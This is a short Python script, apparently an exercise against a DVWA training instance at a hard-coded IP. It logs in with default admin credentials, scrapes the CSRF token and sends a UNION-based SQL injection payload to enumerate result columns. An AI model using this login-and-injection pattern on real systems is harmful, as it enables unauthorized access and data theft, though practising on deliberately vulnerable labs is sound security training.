
import requests
import re

session = requests.Session()

# Get login page to extract token
response = session.get('http://31.97.117.123/login.php')
match = re.search(r"user_token'\s+value='([a-f0-9]+)'", response.text)
token = match.group(1) if match else None

# Login
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': token
}

response = session.post('http://31.97.117.123/login.php', data=login_data)

# Let me test a simple UNION injection first to see what columns are returned
sqli_payload = "999 UNION SELECT 1,2,3,4,5-- -"
response = session.get('http://31.97.117.123/vulnerabilities/sqli/', params={'id': sqli_payload, 'Submit': 'Submit'})

# Find where the results are displayed
start_idx = response.text.find('<pre>')
end_idx = response.text.find('</pre>')

if start_idx > 0 and end_idx > 0:
    results_section = response.text[start_idx:end_idx+6]
    print("Results section from UNION SELECT 1,2,3,4,5:")
    print(results_section)
    print("\n" + "="*80 + "\n")
else:
    print("Results section not found")
    # Let's search for the actual result display
    if 'First name' in response.text:
        idx = response.text.find('First name')
        print("Found 'First name' at position", idx)
        print(response.text[max(0, idx-200):idx+500])

